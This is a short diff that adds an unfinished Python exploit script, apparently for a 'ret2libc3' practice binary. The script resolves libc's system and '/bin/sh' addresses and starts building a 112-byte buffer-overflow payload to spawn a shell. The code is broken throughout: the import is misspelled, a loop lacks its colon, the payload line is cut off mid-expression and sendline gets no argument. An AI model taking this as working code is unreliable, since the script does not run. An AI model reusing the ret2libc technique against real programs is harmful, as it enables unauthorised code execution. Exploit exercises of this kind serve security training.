@@ -1,0 +1,12 @@
+from pwb import *
+
+p = process("./ret2libc3")
+libc = ELF("./libc.so")
+__libc_start_main = libc.symbols["__libc_start_main"]
+system = libc.symbols["system"]
+str_binsh = 0x0
+for address in libc.search("/bin/sh\x00")
+	str_binsh = address
+
+payload1 = 'a'*112+
+p.sendline()
